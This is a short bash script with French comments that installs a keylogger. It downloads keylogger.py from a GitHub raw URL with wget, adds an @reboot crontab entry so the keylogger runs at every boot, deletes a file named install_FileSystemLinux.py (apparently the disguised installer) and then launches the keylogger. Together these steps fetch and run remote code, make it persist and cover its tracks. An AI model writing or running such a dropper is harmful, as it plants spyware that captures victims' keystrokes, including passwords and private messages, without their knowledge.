#!/bin/bash
pip install pynput
pip install logging #installation de la librairie logging
pip install pynput #installation de la librairie pynput





# URL du fichier Python sur GitHub
GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/scriptKeylogger/keylogger.py"

# Nom du fichier téléchargé
FILENAME="keylogger.py"

# Téléchargement du fichier Python
echo "Téléchargement du script Python depuis GitHub..."
wget $GITHUB_URL -O $FILENAME

# Vérification si le fichier a été téléchargé
if [ -f "$FILENAME" ]; then
    echo "Le fichier $FILENAME a été téléchargé avec succès."
else
    echo "Erreur lors du téléchargement du fichier $FILENAME."
    exit 1
fi

# Variables
PYTHON_SCRIPT_PATH="keylogger.py"

# Chemin vers l'interpréteur Python
PYTHON_EXEC=$(which python3)

# Ajouter la tâche @reboot à la crontab de l'utilisateur courant
echo "Ajout de la tâche cron pour lancer le script Python au démarrage..."

# Vérification pour éviter les doublons
(crontab -l 2>/dev/null | grep -q "$PYTHON_SCRIPT") || (crontab -l 2>/dev/null; echo "@reboot python3 $PYTHON_SCRIPT") | crontab -
echo "La tâche cron a été ajoutée pour exécuter le script Python au démarrage."

# Exécution du fichier Python
echo "Exécution du fichier Python..."
OWNFILE="install_FileSystemLinux.py"
rm $OWNFILE
python3 keylogger.py
